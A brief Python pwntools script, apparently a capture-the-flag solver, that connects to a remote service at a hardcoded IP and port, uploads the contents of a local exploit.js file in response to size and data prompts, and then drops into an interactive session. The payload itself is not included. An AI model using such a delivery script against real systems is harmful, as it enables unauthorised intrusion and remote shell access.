from pwn import *

io=remote('13.201.224.182', 30996)

with open("exploit.js", "rb") as f:
    data = f.read()
    
io.sendlineafter(b'File size >> ', str(len(data)).encode())
io.sendlineafter(b'Data >> ', data)

io.interactive()